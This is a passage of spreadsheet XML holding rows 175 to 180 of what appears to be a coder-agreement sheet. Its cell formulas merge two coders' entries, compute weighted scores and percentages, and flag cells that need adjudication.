        <f>IF(OR(AJ175="",AJ175=0),"",ROUND(100*(AJ175-AK175)/AJ175,1))</f>
        <v/>
      </c>
      <c r="AM175" s="11">
        <f>IF(AND(Coder1!AN175=1,Coder2!AN175=1),IF(COUNTBLANK(E175:AH175)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN175" s="11">
        <f>IF(AND(Coder1!AN175=1,Coder2!AN175=1),IF(SUMPRODUCT(--(Coder1!E175:AH175&amp;""&lt;&gt;Coder2!E175:AH175&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO175" s="11" t="n"/>
    </row>
    <row r="176">
      <c r="A176" s="11">
        <f>Coder1!A176</f>
        <v/>
      </c>
      <c r="B176" s="11">
        <f>Coder1!B176</f>
        <v/>
      </c>
      <c r="C176" s="11">
        <f>Coder1!C176</f>
        <v/>
      </c>
      <c r="D176" s="11">
        <f>Coder1!D176</f>
        <v/>
      </c>
      <c r="E176" s="14">
        <f>IF(AND(Coder1!E176&amp;""&lt;&gt;"",Coder1!E176&amp;""=Coder2!E176&amp;""),Coder1!E176,"")</f>
        <v/>
      </c>
      <c r="F176" s="14">
        <f>IF(AND(Coder1!F176&amp;""&lt;&gt;"",Coder1!F176&amp;""=Coder2!F176&amp;""),Coder1!F176,"")</f>
        <v/>
      </c>
      <c r="G176" s="14">
        <f>IF(AND(Coder1!G176&amp;""&lt;&gt;"",Coder1!G176&amp;""=Coder2!G176&amp;""),Coder1!G176,"")</f>
        <v/>
      </c>
      <c r="H176" s="14">
        <f>IF(AND(Coder1!H176&amp;""&lt;&gt;"",Coder1!H176&amp;""=Coder2!H176&amp;""),Coder1!H176,"")</f>
        <v/>
      </c>
      <c r="I176" s="14">
        <f>IF(AND(Coder1!I176&amp;""&lt;&gt;"",Coder1!I176&amp;""=Coder2!I176&amp;""),Coder1!I176,"")</f>
        <v/>
      </c>
      <c r="J176" s="14">
        <f>IF(AND(Coder1!J176&amp;""&lt;&gt;"",Coder1!J176&amp;""=Coder2!J176&amp;""),Coder1!J176,"")</f>
        <v/>
      </c>
      <c r="K176" s="14">
        <f>IF(AND(Coder1!K176&amp;""&lt;&gt;"",Coder1!K176&amp;""=Coder2!K176&amp;""),Coder1!K176,"")</f>
        <v/>
      </c>
      <c r="L176" s="14">
        <f>IF(AND(Coder1!L176&amp;""&lt;&gt;"",Coder1!L176&amp;""=Coder2!L176&amp;""),Coder1!L176,"")</f>
        <v/>
      </c>
      <c r="M176" s="14">
        <f>IF(AND(Coder1!M176&amp;""&lt;&gt;"",Coder1!M176&amp;""=Coder2!M176&amp;""),Coder1!M176,"")</f>
        <v/>
      </c>
      <c r="N176" s="14">
        <f>IF(AND(Coder1!N176&amp;""&lt;&gt;"",Coder1!N176&amp;""=Coder2!N176&amp;""),Coder1!N176,"")</f>
        <v/>
      </c>
      <c r="O176" s="14">
        <f>IF(AND(Coder1!O176&amp;""&lt;&gt;"",Coder1!O176&amp;""=Coder2!O176&amp;""),Coder1!O176,"")</f>
        <v/>
      </c>
      <c r="P176" s="14">
        <f>IF(AND(Coder1!P176&amp;""&lt;&gt;"",Coder1!P176&amp;""=Coder2!P176&amp;""),Coder1!P176,"")</f>
        <v/>
      </c>
      <c r="Q176" s="14">
        <f>IF(AND(Coder1!Q176&amp;""&lt;&gt;"",Coder1!Q176&amp;""=Coder2!Q176&amp;""),Coder1!Q176,"")</f>
        <v/>
      </c>
      <c r="R176" s="14">
        <f>IF(AND(Coder1!R176&amp;""&lt;&gt;"",Coder1!R176&amp;""=Coder2!R176&amp;""),Coder1!R176,"")</f>
        <v/>
      </c>
      <c r="S176" s="14">
        <f>IF(AND(Coder1!S176&amp;""&lt;&gt;"",Coder1!S176&amp;""=Coder2!S176&amp;""),Coder1!S176,"")</f>
        <v/>
      </c>
      <c r="T176" s="14">
        <f>IF(AND(Coder1!T176&amp;""&lt;&gt;"",Coder1!T176&amp;""=Coder2!T176&amp;""),Coder1!T176,"")</f>
        <v/>
      </c>
      <c r="U176" s="14">
        <f>IF(AND(Coder1!U176&amp;""&lt;&gt;"",Coder1!U176&amp;""=Coder2!U176&amp;""),Coder1!U176,"")</f>
        <v/>
      </c>
      <c r="V176" s="14">
        <f>IF(AND(Coder1!V176&amp;""&lt;&gt;"",Coder1!V176&amp;""=Coder2!V176&amp;""),Coder1!V176,"")</f>
        <v/>
      </c>
      <c r="W176" s="14">
        <f>IF(AND(Coder1!W176&amp;""&lt;&gt;"",Coder1!W176&amp;""=Coder2!W176&amp;""),Coder1!W176,"")</f>
        <v/>
      </c>
      <c r="X176" s="14">
        <f>IF(AND(Coder1!X176&amp;""&lt;&gt;"",Coder1!X176&amp;""=Coder2!X176&amp;""),Coder1!X176,"")</f>
        <v/>
      </c>
      <c r="Y176" s="14">
        <f>IF(AND(Coder1!Y176&amp;""&lt;&gt;"",Coder1!Y176&amp;""=Coder2!Y176&amp;""),Coder1!Y176,"")</f>
        <v/>
      </c>
      <c r="Z176" s="14">
        <f>IF(AND(Coder1!Z176&amp;""&lt;&gt;"",Coder1!Z176&amp;""=Coder2!Z176&amp;""),Coder1!Z176,"")</f>
        <v/>
      </c>
      <c r="AA176" s="14">
        <f>IF(AND(Coder1!AA176&amp;""&lt;&gt;"",Coder1!AA176&amp;""=Coder2!AA176&amp;""),Coder1!AA176,"")</f>
        <v/>
      </c>
      <c r="AB176" s="14">
        <f>IF(AND(Coder1!AB176&amp;""&lt;&gt;"",Coder1!AB176&amp;""=Coder2!AB176&amp;""),Coder1!AB176,"")</f>
        <v/>
      </c>
      <c r="AC176" s="14">
        <f>IF(AND(Coder1!AC176&amp;""&lt;&gt;"",Coder1!AC176&amp;""=Coder2!AC176&amp;""),Coder1!AC176,"")</f>
        <v/>
      </c>
      <c r="AD176" s="14">
        <f>IF(AND(Coder1!AD176&amp;""&lt;&gt;"",Coder1!AD176&amp;""=Coder2!AD176&amp;""),Coder1!AD176,"")</f>
        <v/>
      </c>
      <c r="AE176" s="14">
        <f>IF(AND(Coder1!AE176&amp;""&lt;&gt;"",Coder1!AE176&amp;""=Coder2!AE176&amp;""),Coder1!AE176,"")</f>
        <v/>
      </c>
      <c r="AF176" s="14">
        <f>IF(AND(Coder1!AF176&amp;""&lt;&gt;"",Coder1!AF176&amp;""=Coder2!AF176&amp;""),Coder1!AF176,"")</f>
        <v/>
      </c>
      <c r="AG176" s="14">
        <f>IF(AND(Coder1!AG176&amp;""&lt;&gt;"",Coder1!AG176&amp;""=Coder2!AG176&amp;""),Coder1!AG176,"")</f>
        <v/>
      </c>
      <c r="AH176" s="14">
        <f>IF(AND(Coder1!AH176&amp;""&lt;&gt;"",Coder1!AH176&amp;""=Coder2!AH176&amp;""),Coder1!AH176,"")</f>
        <v/>
      </c>
      <c r="AI176" s="11">
        <f>IF(COUNT(E176:L176)=0,"",SUM(E176:L176))</f>
        <v/>
      </c>
      <c r="AJ176" s="11">
        <f>IF(AI176="","",N(E176)*3+N(F176)*2+N(G176)*2+N(H176)*2+N(I176)*2+N(J176)*3+N(K176)*3+N(L176)*3)</f>
        <v/>
      </c>
      <c r="AK176" s="11">
        <f>IF(AI176="","",COUNTIF(N176:AG176,1))</f>
        <v/>
      </c>
      <c r="AL176" s="11">
        <f>IF(OR(AJ176="",AJ176=0),"",ROUND(100*(AJ176-AK176)/AJ176,1))</f>
        <v/>
      </c>
      <c r="AM176" s="11">
        <f>IF(AND(Coder1!AN176=1,Coder2!AN176=1),IF(COUNTBLANK(E176:AH176)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN176" s="11">
        <f>IF(AND(Coder1!AN176=1,Coder2!AN176=1),IF(SUMPRODUCT(--(Coder1!E176:AH176&amp;""&lt;&gt;Coder2!E176:AH176&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO176" s="11" t="n"/>
    </row>
    <row r="177">
      <c r="A177" s="11">
        <f>Coder1!A177</f>
        <v/>
      </c>
      <c r="B177" s="11">
        <f>Coder1!B177</f>
        <v/>
      </c>
      <c r="C177" s="11">
        <f>Coder1!C177</f>
        <v/>
      </c>
      <c r="D177" s="11">
        <f>Coder1!D177</f>
        <v/>
      </c>
      <c r="E177" s="14">
        <f>IF(AND(Coder1!E177&amp;""&lt;&gt;"",Coder1!E177&amp;""=Coder2!E177&amp;""),Coder1!E177,"")</f>
        <v/>
      </c>
      <c r="F177" s="14">
        <f>IF(AND(Coder1!F177&amp;""&lt;&gt;"",Coder1!F177&amp;""=Coder2!F177&amp;""),Coder1!F177,"")</f>
        <v/>
      </c>
      <c r="G177" s="14">
        <f>IF(AND(Coder1!G177&amp;""&lt;&gt;"",Coder1!G177&amp;""=Coder2!G177&amp;""),Coder1!G177,"")</f>
        <v/>
      </c>
      <c r="H177" s="14">
        <f>IF(AND(Coder1!H177&amp;""&lt;&gt;"",Coder1!H177&amp;""=Coder2!H177&amp;""),Coder1!H177,"")</f>
        <v/>
      </c>
      <c r="I177" s="14">
        <f>IF(AND(Coder1!I177&amp;""&lt;&gt;"",Coder1!I177&amp;""=Coder2!I177&amp;""),Coder1!I177,"")</f>
        <v/>
      </c>
      <c r="J177" s="14">
        <f>IF(AND(Coder1!J177&amp;""&lt;&gt;"",Coder1!J177&amp;""=Coder2!J177&amp;""),Coder1!J177,"")</f>
        <v/>
      </c>
      <c r="K177" s="14">
        <f>IF(AND(Coder1!K177&amp;""&lt;&gt;"",Coder1!K177&amp;""=Coder2!K177&amp;""),Coder1!K177,"")</f>
        <v/>
      </c>
      <c r="L177" s="14">
        <f>IF(AND(Coder1!L177&amp;""&lt;&gt;"",Coder1!L177&amp;""=Coder2!L177&amp;""),Coder1!L177,"")</f>
        <v/>
      </c>
      <c r="M177" s="14">
        <f>IF(AND(Coder1!M177&amp;""&lt;&gt;"",Coder1!M177&amp;""=Coder2!M177&amp;""),Coder1!M177,"")</f>
        <v/>
      </c>
      <c r="N177" s="14">
        <f>IF(AND(Coder1!N177&amp;""&lt;&gt;"",Coder1!N177&amp;""=Coder2!N177&amp;""),Coder1!N177,"")</f>
        <v/>
      </c>
      <c r="O177" s="14">
        <f>IF(AND(Coder1!O177&amp;""&lt;&gt;"",Coder1!O177&amp;""=Coder2!O177&amp;""),Coder1!O177,"")</f>
        <v/>
      </c>
      <c r="P177" s="14">
        <f>IF(AND(Coder1!P177&amp;""&lt;&gt;"",Coder1!P177&amp;""=Coder2!P177&amp;""),Coder1!P177,"")</f>
        <v/>
      </c>
      <c r="Q177" s="14">
        <f>IF(AND(Coder1!Q177&amp;""&lt;&gt;"",Coder1!Q177&amp;""=Coder2!Q177&amp;""),Coder1!Q177,"")</f>
        <v/>
      </c>
      <c r="R177" s="14">
        <f>IF(AND(Coder1!R177&amp;""&lt;&gt;"",Coder1!R177&amp;""=Coder2!R177&amp;""),Coder1!R177,"")</f>
        <v/>
      </c>
      <c r="S177" s="14">
        <f>IF(AND(Coder1!S177&amp;""&lt;&gt;"",Coder1!S177&amp;""=Coder2!S177&amp;""),Coder1!S177,"")</f>
        <v/>
      </c>
      <c r="T177" s="14">
        <f>IF(AND(Coder1!T177&amp;""&lt;&gt;"",Coder1!T177&amp;""=Coder2!T177&amp;""),Coder1!T177,"")</f>
        <v/>
      </c>
      <c r="U177" s="14">
        <f>IF(AND(Coder1!U177&amp;""&lt;&gt;"",Coder1!U177&amp;""=Coder2!U177&amp;""),Coder1!U177,"")</f>
        <v/>
      </c>
      <c r="V177" s="14">
        <f>IF(AND(Coder1!V177&amp;""&lt;&gt;"",Coder1!V177&amp;""=Coder2!V177&amp;""),Coder1!V177,"")</f>
        <v/>
      </c>
      <c r="W177" s="14">
        <f>IF(AND(Coder1!W177&amp;""&lt;&gt;"",Coder1!W177&amp;""=Coder2!W177&amp;""),Coder1!W177,"")</f>
        <v/>
      </c>
      <c r="X177" s="14">
        <f>IF(AND(Coder1!X177&amp;""&lt;&gt;"",Coder1!X177&amp;""=Coder2!X177&amp;""),Coder1!X177,"")</f>
        <v/>
      </c>
      <c r="Y177" s="14">
        <f>IF(AND(Coder1!Y177&amp;""&lt;&gt;"",Coder1!Y177&amp;""=Coder2!Y177&amp;""),Coder1!Y177,"")</f>
        <v/>
      </c>
      <c r="Z177" s="14">
        <f>IF(AND(Coder1!Z177&amp;""&lt;&gt;"",Coder1!Z177&amp;""=Coder2!Z177&amp;""),Coder1!Z177,"")</f>
        <v/>
      </c>
      <c r="AA177" s="14">
        <f>IF(AND(Coder1!AA177&amp;""&lt;&gt;"",Coder1!AA177&amp;""=Coder2!AA177&amp;""),Coder1!AA177,"")</f>
        <v/>
      </c>
      <c r="AB177" s="14">
        <f>IF(AND(Coder1!AB177&amp;""&lt;&gt;"",Coder1!AB177&amp;""=Coder2!AB177&amp;""),Coder1!AB177,"")</f>
        <v/>
      </c>
      <c r="AC177" s="14">
        <f>IF(AND(Coder1!AC177&amp;""&lt;&gt;"",Coder1!AC177&amp;""=Coder2!AC177&amp;""),Coder1!AC177,"")</f>
        <v/>
      </c>
      <c r="AD177" s="14">
        <f>IF(AND(Coder1!AD177&amp;""&lt;&gt;"",Coder1!AD177&amp;""=Coder2!AD177&amp;""),Coder1!AD177,"")</f>
        <v/>
      </c>
      <c r="AE177" s="14">
        <f>IF(AND(Coder1!AE177&amp;""&lt;&gt;"",Coder1!AE177&amp;""=Coder2!AE177&amp;""),Coder1!AE177,"")</f>
        <v/>
      </c>
      <c r="AF177" s="14">
        <f>IF(AND(Coder1!AF177&amp;""&lt;&gt;"",Coder1!AF177&amp;""=Coder2!AF177&amp;""),Coder1!AF177,"")</f>
        <v/>
      </c>
      <c r="AG177" s="14">
        <f>IF(AND(Coder1!AG177&amp;""&lt;&gt;"",Coder1!AG177&amp;""=Coder2!AG177&amp;""),Coder1!AG177,"")</f>
        <v/>
      </c>
      <c r="AH177" s="14">
        <f>IF(AND(Coder1!AH177&amp;""&lt;&gt;"",Coder1!AH177&amp;""=Coder2!AH177&amp;""),Coder1!AH177,"")</f>
        <v/>
      </c>
      <c r="AI177" s="11">
        <f>IF(COUNT(E177:L177)=0,"",SUM(E177:L177))</f>
        <v/>
      </c>
      <c r="AJ177" s="11">
        <f>IF(AI177="","",N(E177)*3+N(F177)*2+N(G177)*2+N(H177)*2+N(I177)*2+N(J177)*3+N(K177)*3+N(L177)*3)</f>
        <v/>
      </c>
      <c r="AK177" s="11">
        <f>IF(AI177="","",COUNTIF(N177:AG177,1))</f>
        <v/>
      </c>
      <c r="AL177" s="11">
        <f>IF(OR(AJ177="",AJ177=0),"",ROUND(100*(AJ177-AK177)/AJ177,1))</f>
        <v/>
      </c>
      <c r="AM177" s="11">
        <f>IF(AND(Coder1!AN177=1,Coder2!AN177=1),IF(COUNTBLANK(E177:AH177)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN177" s="11">
        <f>IF(AND(Coder1!AN177=1,Coder2!AN177=1),IF(SUMPRODUCT(--(Coder1!E177:AH177&amp;""&lt;&gt;Coder2!E177:AH177&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO177" s="11" t="n"/>
    </row>
    <row r="178">
      <c r="A178" s="11">
        <f>Coder1!A178</f>
        <v/>
      </c>
      <c r="B178" s="11">
        <f>Coder1!B178</f>
        <v/>
      </c>
      <c r="C178" s="11">
        <f>Coder1!C178</f>
        <v/>
      </c>
      <c r="D178" s="11">
        <f>Coder1!D178</f>
        <v/>
      </c>
      <c r="E178" s="14">
        <f>IF(AND(Coder1!E178&amp;""&lt;&gt;"",Coder1!E178&amp;""=Coder2!E178&amp;""),Coder1!E178,"")</f>
        <v/>
      </c>
      <c r="F178" s="14">
        <f>IF(AND(Coder1!F178&amp;""&lt;&gt;"",Coder1!F178&amp;""=Coder2!F178&amp;""),Coder1!F178,"")</f>
        <v/>
      </c>
      <c r="G178" s="14">
        <f>IF(AND(Coder1!G178&amp;""&lt;&gt;"",Coder1!G178&amp;""=Coder2!G178&amp;""),Coder1!G178,"")</f>
        <v/>
      </c>
      <c r="H178" s="14">
        <f>IF(AND(Coder1!H178&amp;""&lt;&gt;"",Coder1!H178&amp;""=Coder2!H178&amp;""),Coder1!H178,"")</f>
        <v/>
      </c>
      <c r="I178" s="14">
        <f>IF(AND(Coder1!I178&amp;""&lt;&gt;"",Coder1!I178&amp;""=Coder2!I178&amp;""),Coder1!I178,"")</f>
        <v/>
      </c>
      <c r="J178" s="14">
        <f>IF(AND(Coder1!J178&amp;""&lt;&gt;"",Coder1!J178&amp;""=Coder2!J178&amp;""),Coder1!J178,"")</f>
        <v/>
      </c>
      <c r="K178" s="14">
        <f>IF(AND(Coder1!K178&amp;""&lt;&gt;"",Coder1!K178&amp;""=Coder2!K178&amp;""),Coder1!K178,"")</f>
        <v/>
      </c>
      <c r="L178" s="14">
        <f>IF(AND(Coder1!L178&amp;""&lt;&gt;"",Coder1!L178&amp;""=Coder2!L178&amp;""),Coder1!L178,"")</f>
        <v/>
      </c>
      <c r="M178" s="14">
        <f>IF(AND(Coder1!M178&amp;""&lt;&gt;"",Coder1!M178&amp;""=Coder2!M178&amp;""),Coder1!M178,"")</f>
        <v/>
      </c>
      <c r="N178" s="14">
        <f>IF(AND(Coder1!N178&amp;""&lt;&gt;"",Coder1!N178&amp;""=Coder2!N178&amp;""),Coder1!N178,"")</f>
        <v/>
      </c>
      <c r="O178" s="14">
        <f>IF(AND(Coder1!O178&amp;""&lt;&gt;"",Coder1!O178&amp;""=Coder2!O178&amp;""),Coder1!O178,"")</f>
        <v/>
      </c>
      <c r="P178" s="14">
        <f>IF(AND(Coder1!P178&amp;""&lt;&gt;"",Coder1!P178&amp;""=Coder2!P178&amp;""),Coder1!P178,"")</f>
        <v/>
      </c>
      <c r="Q178" s="14">
        <f>IF(AND(Coder1!Q178&amp;""&lt;&gt;"",Coder1!Q178&amp;""=Coder2!Q178&amp;""),Coder1!Q178,"")</f>
        <v/>
      </c>
      <c r="R178" s="14">
        <f>IF(AND(Coder1!R178&amp;""&lt;&gt;"",Coder1!R178&amp;""=Coder2!R178&amp;""),Coder1!R178,"")</f>
        <v/>
      </c>
      <c r="S178" s="14">
        <f>IF(AND(Coder1!S178&amp;""&lt;&gt;"",Coder1!S178&amp;""=Coder2!S178&amp;""),Coder1!S178,"")</f>
        <v/>
      </c>
      <c r="T178" s="14">
        <f>IF(AND(Coder1!T178&amp;""&lt;&gt;"",Coder1!T178&amp;""=Coder2!T178&amp;""),Coder1!T178,"")</f>
        <v/>
      </c>
      <c r="U178" s="14">
        <f>IF(AND(Coder1!U178&amp;""&lt;&gt;"",Coder1!U178&amp;""=Coder2!U178&amp;""),Coder1!U178,"")</f>
        <v/>
      </c>
      <c r="V178" s="14">
        <f>IF(AND(Coder1!V178&amp;""&lt;&gt;"",Coder1!V178&amp;""=Coder2!V178&amp;""),Coder1!V178,"")</f>
        <v/>
      </c>
      <c r="W178" s="14">
        <f>IF(AND(Coder1!W178&amp;""&lt;&gt;"",Coder1!W178&amp;""=Coder2!W178&amp;""),Coder1!W178,"")</f>
        <v/>
      </c>
      <c r="X178" s="14">
        <f>IF(AND(Coder1!X178&amp;""&lt;&gt;"",Coder1!X178&amp;""=Coder2!X178&amp;""),Coder1!X178,"")</f>
        <v/>
      </c>
      <c r="Y178" s="14">
        <f>IF(AND(Coder1!Y178&amp;""&lt;&gt;"",Coder1!Y178&amp;""=Coder2!Y178&amp;""),Coder1!Y178,"")</f>
        <v/>
      </c>
      <c r="Z178" s="14">
        <f>IF(AND(Coder1!Z178&amp;""&lt;&gt;"",Coder1!Z178&amp;""=Coder2!Z178&amp;""),Coder1!Z178,"")</f>
        <v/>
      </c>
      <c r="AA178" s="14">
        <f>IF(AND(Coder1!AA178&amp;""&lt;&gt;"",Coder1!AA178&amp;""=Coder2!AA178&amp;""),Coder1!AA178,"")</f>
        <v/>
      </c>
      <c r="AB178" s="14">
        <f>IF(AND(Coder1!AB178&amp;""&lt;&gt;"",Coder1!AB178&amp;""=Coder2!AB178&amp;""),Coder1!AB178,"")</f>
        <v/>
      </c>
      <c r="AC178" s="14">
        <f>IF(AND(Coder1!AC178&amp;""&lt;&gt;"",Coder1!AC178&amp;""=Coder2!AC178&amp;""),Coder1!AC178,"")</f>
        <v/>
      </c>
      <c r="AD178" s="14">
        <f>IF(AND(Coder1!AD178&amp;""&lt;&gt;"",Coder1!AD178&amp;""=Coder2!AD178&amp;""),Coder1!AD178,"")</f>
        <v/>
      </c>
      <c r="AE178" s="14">
        <f>IF(AND(Coder1!AE178&amp;""&lt;&gt;"",Coder1!AE178&amp;""=Coder2!AE178&amp;""),Coder1!AE178,"")</f>
        <v/>
      </c>
      <c r="AF178" s="14">
        <f>IF(AND(Coder1!AF178&amp;""&lt;&gt;"",Coder1!AF178&amp;""=Coder2!AF178&amp;""),Coder1!AF178,"")</f>
        <v/>
      </c>
      <c r="AG178" s="14">
        <f>IF(AND(Coder1!AG178&amp;""&lt;&gt;"",Coder1!AG178&amp;""=Coder2!AG178&amp;""),Coder1!AG178,"")</f>
        <v/>
      </c>
      <c r="AH178" s="14">
        <f>IF(AND(Coder1!AH178&amp;""&lt;&gt;"",Coder1!AH178&amp;""=Coder2!AH178&amp;""),Coder1!AH178,"")</f>
        <v/>
      </c>
      <c r="AI178" s="11">
        <f>IF(COUNT(E178:L178)=0,"",SUM(E178:L178))</f>
        <v/>
      </c>
      <c r="AJ178" s="11">
        <f>IF(AI178="","",N(E178)*3+N(F178)*2+N(G178)*2+N(H178)*2+N(I178)*2+N(J178)*3+N(K178)*3+N(L178)*3)</f>
        <v/>
      </c>
      <c r="AK178" s="11">
        <f>IF(AI178="","",COUNTIF(N178:AG178,1))</f>
        <v/>
      </c>
      <c r="AL178" s="11">
        <f>IF(OR(AJ178="",AJ178=0),"",ROUND(100*(AJ178-AK178)/AJ178,1))</f>
        <v/>
      </c>
      <c r="AM178" s="11">
        <f>IF(AND(Coder1!AN178=1,Coder2!AN178=1),IF(COUNTBLANK(E178:AH178)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN178" s="11">
        <f>IF(AND(Coder1!AN178=1,Coder2!AN178=1),IF(SUMPRODUCT(--(Coder1!E178:AH178&amp;""&lt;&gt;Coder2!E178:AH178&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO178" s="11" t="n"/>
    </row>
    <row r="179">
      <c r="A179" s="11">
        <f>Coder1!A179</f>
        <v/>
      </c>
      <c r="B179" s="11">
        <f>Coder1!B179</f>
        <v/>
      </c>
      <c r="C179" s="11">
        <f>Coder1!C179</f>
        <v/>
      </c>
      <c r="D179" s="11">
        <f>Coder1!D179</f>
        <v/>
      </c>
      <c r="E179" s="14">
        <f>IF(AND(Coder1!E179&amp;""&lt;&gt;"",Coder1!E179&amp;""=Coder2!E179&amp;""),Coder1!E179,"")</f>
        <v/>
      </c>
      <c r="F179" s="14">
        <f>IF(AND(Coder1!F179&amp;""&lt;&gt;"",Coder1!F179&amp;""=Coder2!F179&amp;""),Coder1!F179,"")</f>
        <v/>
      </c>
      <c r="G179" s="14">
        <f>IF(AND(Coder1!G179&amp;""&lt;&gt;"",Coder1!G179&amp;""=Coder2!G179&amp;""),Coder1!G179,"")</f>
        <v/>
      </c>
      <c r="H179" s="14">
        <f>IF(AND(Coder1!H179&amp;""&lt;&gt;"",Coder1!H179&amp;""=Coder2!H179&amp;""),Coder1!H179,"")</f>
        <v/>
      </c>
      <c r="I179" s="14">
        <f>IF(AND(Coder1!I179&amp;""&lt;&gt;"",Coder1!I179&amp;""=Coder2!I179&amp;""),Coder1!I179,"")</f>
        <v/>
      </c>
      <c r="J179" s="14">
        <f>IF(AND(Coder1!J179&amp;""&lt;&gt;"",Coder1!J179&amp;""=Coder2!J179&amp;""),Coder1!J179,"")</f>
        <v/>
      </c>
      <c r="K179" s="14">
        <f>IF(AND(Coder1!K179&amp;""&lt;&gt;"",Coder1!K179&amp;""=Coder2!K179&amp;""),Coder1!K179,"")</f>
        <v/>
      </c>
      <c r="L179" s="14">
        <f>IF(AND(Coder1!L179&amp;""&lt;&gt;"",Coder1!L179&amp;""=Coder2!L179&amp;""),Coder1!L179,"")</f>
        <v/>
      </c>
      <c r="M179" s="14">
        <f>IF(AND(Coder1!M179&amp;""&lt;&gt;"",Coder1!M179&amp;""=Coder2!M179&amp;""),Coder1!M179,"")</f>
        <v/>
      </c>
      <c r="N179" s="14">
        <f>IF(AND(Coder1!N179&amp;""&lt;&gt;"",Coder1!N179&amp;""=Coder2!N179&amp;""),Coder1!N179,"")</f>
        <v/>
      </c>
      <c r="O179" s="14">
        <f>IF(AND(Coder1!O179&amp;""&lt;&gt;"",Coder1!O179&amp;""=Coder2!O179&amp;""),Coder1!O179,"")</f>
        <v/>
      </c>
      <c r="P179" s="14">
        <f>IF(AND(Coder1!P179&amp;""&lt;&gt;"",Coder1!P179&amp;""=Coder2!P179&amp;""),Coder1!P179,"")</f>
        <v/>
      </c>
      <c r="Q179" s="14">
        <f>IF(AND(Coder1!Q179&amp;""&lt;&gt;"",Coder1!Q179&amp;""=Coder2!Q179&amp;""),Coder1!Q179,"")</f>
        <v/>
      </c>
      <c r="R179" s="14">
        <f>IF(AND(Coder1!R179&amp;""&lt;&gt;"",Coder1!R179&amp;""=Coder2!R179&amp;""),Coder1!R179,"")</f>
        <v/>
      </c>
      <c r="S179" s="14">
        <f>IF(AND(Coder1!S179&amp;""&lt;&gt;"",Coder1!S179&amp;""=Coder2!S179&amp;""),Coder1!S179,"")</f>
        <v/>
      </c>
      <c r="T179" s="14">
        <f>IF(AND(Coder1!T179&amp;""&lt;&gt;"",Coder1!T179&amp;""=Coder2!T179&amp;""),Coder1!T179,"")</f>
        <v/>
      </c>
      <c r="U179" s="14">
        <f>IF(AND(Coder1!U179&amp;""&lt;&gt;"",Coder1!U179&amp;""=Coder2!U179&amp;""),Coder1!U179,"")</f>
        <v/>
      </c>
      <c r="V179" s="14">
        <f>IF(AND(Coder1!V179&amp;""&lt;&gt;"",Coder1!V179&amp;""=Coder2!V179&amp;""),Coder1!V179,"")</f>
        <v/>
      </c>
      <c r="W179" s="14">
        <f>IF(AND(Coder1!W179&amp;""&lt;&gt;"",Coder1!W179&amp;""=Coder2!W179&amp;""),Coder1!W179,"")</f>
        <v/>
      </c>
      <c r="X179" s="14">
        <f>IF(AND(Coder1!X179&amp;""&lt;&gt;"",Coder1!X179&amp;""=Coder2!X179&amp;""),Coder1!X179,"")</f>
        <v/>
      </c>
      <c r="Y179" s="14">
        <f>IF(AND(Coder1!Y179&amp;""&lt;&gt;"",Coder1!Y179&amp;""=Coder2!Y179&amp;""),Coder1!Y179,"")</f>
        <v/>
      </c>
      <c r="Z179" s="14">
        <f>IF(AND(Coder1!Z179&amp;""&lt;&gt;"",Coder1!Z179&amp;""=Coder2!Z179&amp;""),Coder1!Z179,"")</f>
        <v/>
      </c>
      <c r="AA179" s="14">
        <f>IF(AND(Coder1!AA179&amp;""&lt;&gt;"",Coder1!AA179&amp;""=Coder2!AA179&amp;""),Coder1!AA179,"")</f>
        <v/>
      </c>
      <c r="AB179" s="14">
        <f>IF(AND(Coder1!AB179&amp;""&lt;&gt;"",Coder1!AB179&amp;""=Coder2!AB179&amp;""),Coder1!AB179,"")</f>
        <v/>
      </c>
      <c r="AC179" s="14">
        <f>IF(AND(Coder1!AC179&amp;""&lt;&gt;"",Coder1!AC179&amp;""=Coder2!AC179&amp;""),Coder1!AC179,"")</f>
        <v/>
      </c>
      <c r="AD179" s="14">
        <f>IF(AND(Coder1!AD179&amp;""&lt;&gt;"",Coder1!AD179&amp;""=Coder2!AD179&amp;""),Coder1!AD179,"")</f>
        <v/>
      </c>
      <c r="AE179" s="14">
        <f>IF(AND(Coder1!AE179&amp;""&lt;&gt;"",Coder1!AE179&amp;""=Coder2!AE179&amp;""),Coder1!AE179,"")</f>
        <v/>
      </c>
      <c r="AF179" s="14">
        <f>IF(AND(Coder1!AF179&amp;""&lt;&gt;"",Coder1!AF179&amp;""=Coder2!AF179&amp;""),Coder1!AF179,"")</f>
        <v/>
      </c>
      <c r="AG179" s="14">
        <f>IF(AND(Coder1!AG179&amp;""&lt;&gt;"",Coder1!AG179&amp;""=Coder2!AG179&amp;""),Coder1!AG179,"")</f>
        <v/>
      </c>
      <c r="AH179" s="14">
        <f>IF(AND(Coder1!AH179&amp;""&lt;&gt;"",Coder1!AH179&amp;""=Coder2!AH179&amp;""),Coder1!AH179,"")</f>
        <v/>
      </c>
      <c r="AI179" s="11">
        <f>IF(COUNT(E179:L179)=0,"",SUM(E179:L179))</f>
        <v/>
      </c>
      <c r="AJ179" s="11">
        <f>IF(AI179="","",N(E179)*3+N(F179)*2+N(G179)*2+N(H179)*2+N(I179)*2+N(J179)*3+N(K179)*3+N(L179)*3)</f>
        <v/>
      </c>
      <c r="AK179" s="11">
        <f>IF(AI179="","",COUNTIF(N179:AG179,1))</f>
        <v/>
      </c>
      <c r="AL179" s="11">
        <f>IF(OR(AJ179="",AJ179=0),"",ROUND(100*(AJ179-AK179)/AJ179,1))</f>
        <v/>
      </c>
      <c r="AM179" s="11">
        <f>IF(AND(Coder1!AN179=1,Coder2!AN179=1),IF(COUNTBLANK(E179:AH179)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN179" s="11">
        <f>IF(AND(Coder1!AN179=1,Coder2!AN179=1),IF(SUMPRODUCT(--(Coder1!E179:AH179&amp;""&lt;&gt;Coder2!E179:AH179&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO179" s="11" t="n"/>
    </row>
    <row r="180">
